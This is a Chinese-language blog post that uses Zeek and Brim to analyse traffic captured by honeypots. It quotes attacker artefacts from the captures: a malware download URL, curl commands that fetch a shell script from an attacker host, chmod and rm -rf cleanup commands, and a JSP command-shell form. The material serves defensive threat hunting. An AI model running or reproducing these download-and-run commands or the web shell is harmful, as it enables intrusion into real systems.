![](https://image.3001.net/images/20200804/1596534249.jpg!small)

## 一、两个流量分析工具简介

### **1.1 Zeek简介**

Zeek (曾用名Bro) 是一款大名鼎鼎的开源网络安全分析工具。Zeek 可以监测网络流量中的可疑活动，通过 Zeek
的脚本可以实现灵活的分析功能，可实现多种协议的开相机用的分析。详情请参考官网-https://zeek.org/

### **1.2 Brim简介**

2020年3月份，美国Brimsecurity公司开源了：

Brim(https://github.com/brimsec/brim)

这个工具综合了Wireshark和Zeek(以前的Bro)的特点，特别适合处理大数据量的pcap文件，从流量分析中发现潜在的问题。它由下面的组件组成：

> **①** 结构化日志查询引擎 ZQ
>
> **②** 用于多平台用户界面的 Electron 和 React
>
> **③** 从数据包捕获文件生成网络分析数据的 Zeek
>
> Brim的出现有以下重要的意义：
>
> **①** 站在Zeek的肩膀上分析pcap文件，可以在桌面上进行查找分析metadata，并且对于具体的流量数据可以用wireshark观看
>
> **②** 另外就是它的创始人Steve McCanne（一个大牛人，libcap的作者，tcpdump的co-author）的原话： **We
> wanted to reduce the time it takes anyone – expert incident responders and
> threat hunters, or someone just looking to win a capture-the-flag contest –
> to find interesting data in big pcaps and logs.**
>
> 这里，我很负责人的告诉大家，Brim有毒，极其容易上瘾，慎用……

## 二、蜜罐巡游

笔者在互联网上部署了若干蜜罐，开放了SSH, MongoDB, MySQL,
Telnet等服务，每天可以接收到大量的威胁攻击信息，所有的攻击流量都会自动保存。我们先选取MySQL蜜罐看一下发生的事件。

![](https://image.3001.net/images/20200804/1596534284.png!small)

![](https://image.3001.net/images/20200804/1596534292.png!small)

到Virustotal查看URL:

http://154.209.236.172:8900/3306.exe

发现：

![](https://image.3001.net/images/20200804/1596534300.png!small)

所以根据这个蜜罐里的发现，我们可以推断出这个攻击手法：

> 1）攻击者想把MySQL server变成一个远程执行代码的肉鸡；
>
> 2）通过暴力破解用户并登陆成功；
>
> 3）创建一个数据表，插入一个执行文件的十六进制文本到这个表中；
>
> 4）查询此表并且将十六进制文件保存到本地文件cna12.dll；
>
> 5）通过MySQL中的UDF功能(User Define Function)来加载此dll文件，这里是xpdl3；
>
> 6）远程抓取malware文件到本地执行；
>
> 7）清理现场。

这所有的一切都被蜜罐抓的清清楚楚，无所遁形。

接下来，让我们依次用Zeek和Brim分析一下蜜罐流量。

## 三、Zeek来分析蜜罐流量

### **3.1 Zeek还原的日志**

默认的还原不带文件，所以我们需要写一段程序- file.zeek如下所示，这里demo我们只写几种常见的文件类型，如果需要可以继续补充：

    
    
    global mime_to_ext: table[string] of string = {    ["application/x-dosexec"] = "exe",    ["text/plain"] = "txt",    ["image/jpeg"] = "jpg",    ["image/png"] = "png",    ["application/zip"] = "zip",    ["text/html"] = "html",};event file_sniff(f: fa_file, meta: fa_metadata)    {    if ( ! meta?$mime_type )        return;    if ( meta$mime_type !in mime_to_ext )        return;    local fname = fmt("%s-%s.%s", f$source, f$id, mime_to_ext[meta$mime_type]);    print fmt("Extracting file %s", fname);    Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [$extract_filename=fname]);    }

然后再执行下面的程序就可以把文件还原出来：

zeek -C -r file.zeek 20200428.pcap

从流量还原出来的文件类型，看起来有2种类型，都是在file.log中。

**3.1.1 Txt** **文件**

###### ① sshd.sh

面对如此茫茫多的txt文件，没办法，选几个打开看看里面的内容，下面的内容引起了我的好奇心，而好奇心是威胁狩猎的一个必要条件哦：

HTTP-FWLSSm25obb5LVub12.txt:

    
    
    cmd=curl http://ionage.theworkpc.com:8088/sshd.sh -o /var/tmp/juliuscaesar.sh

HTTP-FbsGTSGkR3kPlCIJ4.txt:

    
    
    cmd=chmod 777 /var/tmp/juliuscaesar.sh

HTTP-FYHAb81wQsh3uX7zob.txt:

    
    
    cmd=rm -rf /var/tmp/juliuscaesar.sh

其实Zeek把所有http的POST请求都当作文件了，因为POST请求的大小未知，不能放在metadata里。这时候我们要继续寻找关联根据id。

**3.1.2 Html** **文件**

在html文件中找到了若干通过shell执行的命令：

    
    
    HTTP-F5L3Vz1cFSc4GTK8S4.html<HTML><BODY>Commands with JSP<FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre>Command: rm -rf /var/tmp/juliuscaesar.sh<BR></pre></BODY></HTML>

###### (1) 关联分析1 - connection.log

这时候我们在做关联分析在connection.log中搜索

    
    
    1588040467.536103 FYHAb81wQsh3uX7zob   205.185.125.243  192.168.101.17   C5SkskjFWCjSkzb89 HTTP   0   (empty)    text/plain -   0.000000  -   T   35  35  0   0   F   -   -   -   -    -   -   -1588040467.536135 F5L3Vz1cFSc4GTK8S4   192.168.101.17   205.185.125.243  C5SkskjFWCjSkzb89 HTTP   0   (empty)    text/html -   0.000000  -   F   225 225 0   0   F   -   -   -   -    -   -   -
这样一来可以这么解释：攻击者（205.185.125.243）向我们的Tomcat蜜罐（内网地址是192.168.101.17，外网地址省略），由于这个蜜罐可以上传文件，所以攻击者上传了一个shell文件（文件在哪里呢？请看下一小节），然后执行了相应的删除指令。

###### (2) 关联分析2 - http.log

然后我们再做关联分析，在http.log中进行搜索，才发现上传了cmd.jsp这个文件。

    
    
    1588040467.536103 C5SkskjFWCjSkzb89 205.185.125.243  51172  192.168.101.17   8080   1    POST   172.105.96.197   /jsp_app/cmd.jsp -   1.1 curl/7.47.0   -   35  225 200 (empty)    -   -   (empty)    -   -   -   FYHAb81wQsh3uX7zob   -   text/plain F5L3Vz1cFSc4GTK8S4    -   text/html

### **3.2 其它的日志文件 - DNS**

##### **3.2.1 dns.log**

看着这个日志，发现几乎都是来自192.168.1.6这个Telnet蜜罐的，内容如下：

    
    
    1588003200.059386 CbkyJ72qaH0OTpRE94   192.168.101.6 55979  23.239.18.5   53  udp 50213    -   188.203.82.42.in-addr.arpa  1   C_INTERNET 12  PTR -   -   F   F   T   F   0   -   -    F

是攻击者登陆到我们的Telnet蜜罐，向这个DNS域名服务器23.239.18.5请求42.82.203.188的反向域名。这里需要注意IPv4的Reverse
DNS lookup。

For example, to do a reverse lookup of the IP address 8.8.4.4 the PTR record
for the domain name 4.4.8.8.in-addr.arpa would be looked up, and found to
point to google-public-dns-b.google.com.

写到这里，大家都明白了：在蜜罐里做DNS查询能有啥好事情呢？

嗯，我们通过Zeek做了一定的分析，不管怎样，还是分析出一些东西，现在激动人心的时刻到了，Brim会给我们带来什么惊喜呢？

## **四、Brim来分析蜜罐流量**

第一步，别忘了修改Brim的时区

File -> Settings，然后修改Timezone为Asia/Shanghai

![](https://image.3001.net/images/20200804/1596534403.png!small)

首先映入眼帘的就是这个pcap的时间轴视图，非常的直观。可我的问题是：为什么只有5点左右的数据啊？我们明明有0点的日志——是数据被丢失了呢？还是怎么回事？后来仔细看看，其实原来都有的，只不过其它时间的事件较少，所以就没显示出来，如果你把鼠标移动过去，还是可以看到的，差点被Brim骗了，套路真深……

![](https://image.3001.net/images/20200804/1596534411.png!small)

这时候就必须介绍一下强大的zq查询语法了，用了以后你简直会怀疑人生——竟然有这么好的工具？？

ZQL - https://github.com/brimsec/zq/blob/master/zql/docs/README.md

现在开始我们的旅程吧

### **4.1 DNS查询**

上次我们花了很多时间用Zeek来分析DNS，那如果有ZQL会怎么样呢？废话少说，直接上ZQL。

    
    
    _path="dns" | count() by id.orig_h

结果如下，发现在蜜罐(6-Telnet, 3-SSH, 9-MySQL)

![](https://image.3001.net/images/20200804/1596534435.png!small)

那我们在想，为什么这3个蜜罐在外发DNS请求，是不是被攻克了？所以我们先看一下MySQL这个蜜罐

![](https://image.3001.net/images/20200804/1596534446.png!small)

![](https://image.3001.net/images/20200804/1596534455.png!small)

然后我们看一下这两个DNS服务器(天际友盟情报(https://alice.tj-un.coam/#)和ipip(https://www.ipip.net/ip.html)查一下)，都正常

![](https://image.3001.net/images/20200804/1596534468.png!small)

![](https://image.3001.net/images/20200804/1596534475.png!small)

再看一下做了哪些查询，需要注意在这里我们要倒着查，比如下图第一行，应该是180.96.63.13

![](https://image.3001.net/images/20200804/1596534528.png!small)

### **![](https://image.3001.net/images/20200804/1596534611.png!small)****4.2
files查询**![](https://image.3001.net/images/20200804/1596534587.png!small)

有了这个，蓦然发现分析流量原来是那么的简单。

## 五、总结

蜜罐最擅长的就是抓取各种攻击流量，而Zeek和Brim能很好的进行流量分析，分析其攻击手法，从而更好的进行防御，有的时候你会感觉自己简直是站在上帝视角在看进攻，那种感觉真的很不错。

